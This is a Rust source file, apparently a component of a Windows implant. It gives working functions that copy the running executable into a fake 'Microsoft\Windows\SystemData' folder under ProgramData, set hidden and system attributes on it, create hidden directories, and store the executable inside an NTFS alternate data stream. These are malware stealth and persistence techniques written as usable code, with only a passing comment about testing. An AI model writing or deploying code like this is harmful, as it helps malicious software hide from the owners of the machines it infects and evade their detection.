use std::path::{Path, PathBuf};
use std::fs;
use std::env;
use windows::core::{Result, PCSTR};
use windows::Win32::Storage::FileSystem::{
    SetFileAttributesA, FILE_ATTRIBUTE_HIDDEN, FILE_ATTRIBUTE_SYSTEM
};
use std::ffi::CString;

pub fn install_to_hidden_location() -> Result<PathBuf> {
    // Target: C:\ProgramData\Microsoft\Windows\SystemData\
    // For safety/testing, we'll use a subdirectory in ProgramData
    let target_dir = env::var("PROGRAMDATA").unwrap_or(String::from("C:\\ProgramData"));
    let target_path = Path::new(&target_dir)
        .join("Microsoft")
        .join("Windows")
        .join("SystemData");
        
    if !target_path.exists() {
        let _ = fs::create_dir_all(&target_path);
    }
    
    let current_exe = env::current_exe().unwrap();
    let exe_name = current_exe.file_name().unwrap();
    let dest_path = target_path.join(exe_name);
    
    // Only copy if we aren't already running from there
    if current_exe != dest_path {
        if let Ok(_) = fs::copy(&current_exe, &dest_path) {
            println!("Installed to hidden location: {:?}", dest_path);
            
            // Set hidden/system attributes
            let dest_str = CString::new(dest_path.to_str().unwrap()).unwrap();
            unsafe {
                let _ = SetFileAttributesA(
                    PCSTR(dest_str.as_ptr() as *const u8),
                    FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_SYSTEM
                );
            }
            return Ok(dest_path);
        }
    }
    
    Ok(current_exe)
}

pub fn get_install_directory() -> PathBuf {
    let target_dir = env::var("PROGRAMDATA").unwrap_or(String::from("C:\\ProgramData"));
    Path::new(&target_dir)
        .join("Microsoft")
        .join("Windows")
        .join("SystemData")
}

pub fn create_hidden_directory(path: &Path) -> std::io::Result<()> {
    if !path.exists() {
        fs::create_dir_all(path)?;
    }
    
    // Set hidden attribute
    let path_str = CString::new(path.to_str().unwrap()).unwrap();
    unsafe {
        let _ = SetFileAttributesA(
            PCSTR(path_str.as_ptr() as *const u8),
            FILE_ATTRIBUTE_HIDDEN
        );
    }
    
    println!("Hidden directory created: {:?}", path);
    Ok(())
}

pub fn copy_self_to_location(dest: &Path) -> std::io::Result<()> {
    let current_exe = env::current_exe()?;
    
    if current_exe == dest {
        return Ok(()); // Already at destination
    }
    
    fs::copy(&current_exe, dest)?;
    println!("Executable copied to: {:?}", dest);
    Ok(())
}

pub fn set_file_hidden_system(path: &Path) -> Result<()> {
    let path_str = CString::new(path.to_str().unwrap()).unwrap();
    unsafe {
        SetFileAttributesA(
            PCSTR(path_str.as_ptr() as *const u8),
            FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_SYSTEM
        )?;
    }
    
    println!("File attributes set to hidden+system: {:?}", path);
    Ok(())
}

pub fn install_to_ads(host_file: &Path) -> std::io::Result<()> {
    // Alternate Data Stream installation
    // Format: host_file.txt:hidden_stream:$DATA
    
    let current_exe = env::current_exe()?;
    let stream_path = format!("{}:sysdata:$DATA", host_file.to_str().unwrap());
    
    println!("Installing to ADS: {}", stream_path);
    
    // Read current executable
    let exe_data = fs::read(&current_exe)?;
    
    // Write to alternate data stream
    fs::write(&stream_path, &exe_data)?;
    
    println!("ADS installation completed");
    Ok(())
}
